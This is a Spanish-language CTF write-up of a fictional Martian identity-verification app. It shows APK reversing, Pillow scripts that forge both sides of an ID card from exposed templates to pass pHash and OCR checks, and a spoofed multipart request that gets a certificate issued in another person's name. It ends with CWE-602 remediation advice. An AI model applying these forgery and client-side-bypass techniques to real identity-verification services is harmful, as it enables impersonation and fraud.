# Desafío - Capturando al Ladrón (HackLab)

**Plataforma:** Software Seguro — HackLab  
**Edición:** HackLab 2026  
**Categoría:** Reversing Apk / Client-Side Enforcement Bypass  
**Puntaje:** 40 pts  
**Autor:** adonaissh  
**Herramientas:** `apktool`, Python (`Pillow`), `curl`  
**Flag:** `2488f977ed47ff0de86c1716640a501b`  

---

## 📌 Enunciado

> Corre el año 264 en la República Martiana. Allí cada ciudadano se identifica con su Credencial de Identidad Marciana (CIM). **VerificAR Marte** es la app oficial que verifica esa identidad: le sacás una foto al frente y otra al dorso de tu credencial y, si todo está en orden, el servicio emite a tu nombre un certificado de identidad marciana verificada.
>
> Antes de enviar nada, la app lee los datos por OCR local, valida el formato de la credencial, reconoce el logo oficial y te muestra los datos en pantalla sin dejarte editarlos.
>
> **Objetivo:** Hay una ladrona suelta y tu misión es hacerte pasar por ella para obtener sus datos. Lográ que el servicio emita el certificado a nombre de **VENKRA DOSS, KAIRA LOM** (matrícula `MRC-48217390`), que tiene 45 años.
>
> **Archivo entregado:** `verificar.apk`

---

## 🔍 Análisis Inicial y Reversing del APK

Un archivo `.apk` es un paquete comprimido en formato ZIP con bytecode Dalvik/ART y recursos compilados. Se descomprimió e inspeccionó con `apktool`:

```bash
apktool d verificar.apk -o verificar_decompiled
```

A diferencia de aplicaciones híbridas basadas en WebView (Capacitor/Cordova), se trata de una aplicación nativa escrita en **Kotlin/Android**. Al analizar el código smali y decompilar las clases en el paquete `com.vulnlabs.verificar`:

### 1. Clases Relevantes
- **`Config`**: Contiene la URL base del servidor de verificación:
  ```kotlin
  SERVIDOR_URL = "https://auth.shared.softwareseguro.com.ar"
  ```
- **`Api.verificar()`**: Construye una petición HTTP `POST` multipart/form-data y la despacha al endpoint `/api/verificar` utilizando la librería **OkHttp3**:
  ```kotlin
  val body = MultipartBody.Builder().setType(MultipartBody.FORM)
      .addFormDataPart("apellido", apellido)
      .addFormDataPart("nombre", nombre)
      .addFormDataPart("matricula", matricula)
      .addFormDataPart("sexo", sexo)
      .addFormDataPart("fecha_nacimiento", fecha)
      .addFormDataPart("foto_frente", "frente.jpg", RequestBody.create(archivoFrente, JPEG))
      .addFormDataPart("foto_dorso", "dorso.jpg", RequestBody.create(archivoDorso, JPEG))
      .build()
  ```
- **`ConfirmarActivity`**: Despliega los datos extraídos en campos `TextView` marcados como no editables.
- **`Ocr`**: Emplea Google ML Kit para ejecutar reconocimiento óptico de caracteres localmente en el dispositivo.

### 2. La Falsa Seguridad del Cliente (Client-Side Only Enforcement)
Todo el pipeline de seguridad (validación de expresiones regulares, OCR en el teléfono, reconocimiento del logo rojo y restricción de edición en la interfaz gráfica) **corre exclusivamente en el cliente**. El servidor remoto no recibe ninguna prueba criptográfica del dispositivo; únicamente procesa la petición HTTP `multipart/form-data`.

Por lo tanto, no es necesario instalar el APK, parchar el binario ni levantar un emulador Android: **podemos interactuar directamente contra la API REST del backend.**

---

## 🔬 Mapeo de Controles del Servidor

En el servidor (`https://auth.shared.softwareseguro.com.ar/`), la raíz `GET /` y el directorio `/static/` exponían los modelos de credencial de ejemplo:
- `https://auth.shared.softwareseguro.com.ar/static/modelo_dni_frente.png`
- `https://auth.shared.softwareseguro.com.ar/static/modelo_dni_dorso.png`

Además, la portada reveló los datos registrales completos del objetivo a suplantar:
- **Apellido:** `VENKRA DOSS`
- **Nombre:** `KAIRA LOM`
- **Matrícula:** `MRC-48217390`
- **Sexo:** `F`
- **Fecha de Nacimiento:** `14/03/0219` (Año 264 - 45 años = 219)
- **Vencimiento:** `14/03/0241`

### Análisis de la Respuesta del Servidor
Al realizar un primer envío de prueba con `curl` enviando las imágenes modelo sin modificar pero con los datos de texto de la ladrona:

```bash
curl -s -X POST https://auth.shared.softwareseguro.com.ar/api/verificar \
  -F "apellido=VENKRA DOSS" -F "nombre=KAIRA LOM" \
  -F "matricula=MRC-48217390" -F "sexo=F" -F "fecha_nacimiento=14/03/0219" \
  -F "foto_frente=@modelo_dni_frente.png;type=image/png" \
  -F "foto_dorso=@modelo_dni_dorso.png;type=image/png"
```

El servidor respondió con un desglose exhaustivo de los controles aplicados:
```json
{
  "controles": {
    "datos": true,
    "foto_frente": true,
    "dorso": true,
    "similitud_frente": {
      "distancia": 0,
      "umbral": 22
    },
    "ocr_frente": false,
    "ocr_dorso": false
  },
  "verificado": false
}
```

### Tabla de Controles del Backend
| Control | Descripción |
|---|---|
| `datos` | Los campos de texto en el formulario multipart coinciden con los del objetivo buscado. |
| `similitud_frente` | Hash perceptual (**pHash**) comparando el frente enviado contra la plantilla oficial. Umbral máximo de distancia: **22**. |
| `foto_frente` | Presencia del logo oficial de color rojo. |
| `ocr_frente` | El backend corre OCR sobre la imagen y busca: apellido, nombre, sexo, matrícula y fecha. |
| `ocr_dorso` | El backend corre OCR sobre la zona de lectura mecánica (**MRZ**) del dorso. |
| `dorso` | Validación estructural del fondo y proporciones del dorso. |

> **Vulnerabilidad en el pHash:** El umbral de distancia de Hamming permitido es 22. Modificar únicamente el texto superpuesto sobre el modelo original altera mínimamente la firma perceptual (produciendo una distancia de apenas 1), pasando la validación con holgura.

---

## 🚀 Explotación Paso a Paso

### Paso 1: Forjar el Frente de la Credencial (`forjar_frente.py`)
Utilizando la biblioteca `Pillow` en Python, se clonó una porción del degradado del fondo para ocultar los valores viejos y se escribió la nueva información con tipografía métricamente compatible (`LiberationSans-Bold.ttf`, tamaño 19) en las coordenadas exactas:

```python
#!/usr/bin/env python3
"""Reescribe los valores del frente de la CIM con los datos del objetivo,
manteniendo diseño, colores y logo intactos.
Uso: python forjar_frente.py modelo-frente.png forjado-frente.png
"""
import sys
from PIL import Image, ImageDraw, ImageFont

src, out = sys.argv[1], sys.argv[2]
im = Image.open(src).convert("RGB")
d = ImageDraw.Draw(im)

TXT = (58, 36, 27)
fuente = ImageFont.truetype("LiberationSans-Bold.ttf", 19)

valores = [
    (189, 108, 128, "VENKRA DOSS"),
    (189, 154, 174, "KAIRA LOM"),
    (189, 200, 216, "F"),
    (189, 246, 262, "MRC-48217390"),
    (189, 292, 310, "14/03/0219"),
    (189, 338, 356, "14/03/0241"),
]

def tapar_fondo(x0, y0, x1, y1):
    strip = im.crop((440, y0, 460, y1)).resize((x1 - x0, y1 - y0))
    im.paste(strip, (x0, y0))

for x, y0, y1, _ in valores:
    tapar_fondo(x, y0 - 2, 470, y1 + 3)
for x, y0, _, nuevo in valores:
    d.text((x, y0 - 3), nuevo, font=fuente, fill=TXT)

im.save(out, "PNG")
print("[+] Frente forjado guardado en:", out)
```

---

### Paso 2: Forjar el Dorso con la MRZ (`forjar_dorso.py`)
El dorso posee una zona **MRZ TD1** (3 líneas de 30 caracteres). Al estudiar cómo parsea el OCR del servidor, se descubrió un comportamiento determinante:
- El servidor extrae el nombre como la cadena entre `<<` y el primer `<` de relleno.
- **Detalle crítico:** El OCR del backend no convierte el caracter `<` en espacio dentro de nombres compuestos. Si se escribía `KAIRA<LOM`, el backend leía `KAIRA<LOM != KAIRA LOM` y fallaba `ocr_dorso: false`.
- **Solución:** Escribir el espacio literal en la imagen (`KAIRA LOM`).

```python
#!/usr/bin/env python3
"""Reescribe las tres líneas de la MRZ del dorso de la CIM con los datos del
objetivo (apellido, nombre y matrícula).
Uso: python forjar_dorso.py modelo-dorso.png forjado-dorso.png
"""
import sys
from PIL import Image, ImageDraw, ImageFont

src, out = sys.argv[1], sys.argv[2]
im = Image.open(src).convert("RGB")
d = ImageDraw.Draw(im)

TXT = (58, 36, 27)
mono = ImageFont.truetype("LiberationMono-Bold.ttf", 18)

l1 = "IDMRCMRC48217390" + "<" * 14       # 30 chars
l2 = "1903142F4103149MRC<<<<<<<<<4"       # 28 chars
l3 = "VENKRA<DOSS<<KAIRA LOM" + "<" * 8  # 30 chars con espacio literal

def tapar_fondo(x0, y0, x1, y1):
    strip = im.crop((x0, 200, x1, 200 + (y1 - y0)))
    im.paste(strip, (x0, y0))

tapar_fondo(18, 322, 620, 348)
tapar_fondo(18, 346, 620, 372)
tapar_fondo(18, 370, 620, 396)

d.text((18, 324), l1, font=mono, fill=TXT)
d.text((18, 348), l2, font=mono, fill=TXT)
d.text((18, 372), l3, font=mono, fill=TXT)

im.save(out, "PNG")
print("[+] Dorso forjado guardado en:", out)
```

---

### Paso 3: Envío del Payload Multipart (`verificar.py`)
Se replicó la petición de la app Android emulando el User-Agent exacto de OkHttp:

```python
#!/usr/bin/env python3
import sys, json, uuid, urllib.request, urllib.error

URL = "https://auth.shared.softwareseguro.com.ar/api/verificar"

CAMPOS = {
    "apellido": "VENKRA DOSS",
    "nombre": "KAIRA LOM",
    "matricula": "MRC-48217390",
    "sexo": "F",
    "fecha_nacimiento": "14/03/0219",
}

def multipart(campos, frente, dorso):
    boundary = "----vk" + uuid.uuid4().hex
    b = boundary.encode()
    body = b""
    for k, v in campos.items():
        body += b"--" + b + b"\r\n"
        body += ('Content-Disposition: form-data; name="%s"\r\n\r\n' % k).encode()
        body += v.encode() + b"\r\n"
    for field, path, fn in (("foto_frente", frente, "frente.jpg"),
                            ("foto_dorso", dorso, "dorso.jpg")):
        with open(path, "rb") as f:
            data = f.read()
        body += b"--" + b + b"\r\n"
        body += ('Content-Disposition: form-data; name="%s"; filename="%s"\r\n' % (field, fn)).encode()
        body += b"Content-Type: image/jpeg\r\n\r\n" + data + b"\r\n"
    body += b"--" + b + b"--\r\n"
    return boundary, body

frente, dorso = sys.argv[1], sys.argv[2]
boundary, body = multipart(CAMPOS, frente, dorso)
req = urllib.request.Request(URL, data=body, method="POST")
req.add_header("Content-Type", "multipart/form-data; boundary=%s" % boundary)
req.add_header("User-Agent", "okhttp/4.12.0")

r = urllib.request.urlopen(req, timeout=40)
print(json.dumps(json.loads(r.read()), indent=2, ensure_ascii=False))
```

**Resultado de la ejecución:**
```json
{
  "certificado_url": "/certificado?token=7552a909e2f20be956b5f42c53674f24437a2865277f8ccf100a8000b6dd0b06",
  "controles": {
    "datos": true,
    "dorso": true,
    "foto_frente": true,
    "ocr_dorso": true,
    "ocr_frente": true,
    "similitud_frente": {
      "distancia": 1,
      "umbral": 22
    }
  },
  "mensaje": "Identidad marciana verificada. Cuenta habilitada.",
  "verificado": true
}
```
Todos los controles resultaron en `true`, con una distancia de pHash de **1** (ampliamente inferior a 22).

---

### Paso 4: Descarga del Certificado y Flag
Se consultó la URL del certificado emitida por el servidor:

```bash
curl -s "https://auth.shared.softwareseguro.com.ar/certificado?token=7552a909e2f20be956b5f42c53674f24437a2865277f8ccf100a8000b6dd0b06"
```

El certificado oficial de identidad marciana emitido a nombre de la ladrona contiene la flag en su cuerpo:

```text
==================================================
        CERTIFICADO DE IDENTIDAD MARCIANA
     Nombre: VENKRA DOSS, KAIRA LOM
==================================================

Flag: 2488f977ed47ff0de86c1716640a501b
```

---

## 🏁 Flag

```text
2488f977ed47ff0de86c1716640a501b
```

---

## 🛡️ Causa Raíz y Recomendaciones

- **Causa Raíz:** Confianza indebida en controles de seguridad delegados al cliente (CWE-602). La aplicación móvil implementaba el OCR, validaciones de formato y restricciones de interfaz de forma local, mientras que el backend confiaba en los datos del formulario multipart sin verificar firmas criptográficas de hardware (Attestation API / Play Integrity).
- **Inseguridad de algoritmos de similitud basados en pHash:** El uso de hashes perceptuales con umbrales laxos permite modificar campos textuales sin alterar la estructura global de la imagen.
- **Recomendaciones:**
  - **Validación Criptográfica de la Identidad:** La captura debe firmarse mediante módulos seguros del dispositivo (Android KeyStore con attestations) o exigir video en vivo con prueba de vida activa (liveness detection).
  - **No exponer documentos modelo públicamente:** No servir plantillas idénticas a las oficiales en rutas accesibles (`/static/`) para impedir que los atacantes las usen como base de montaje.
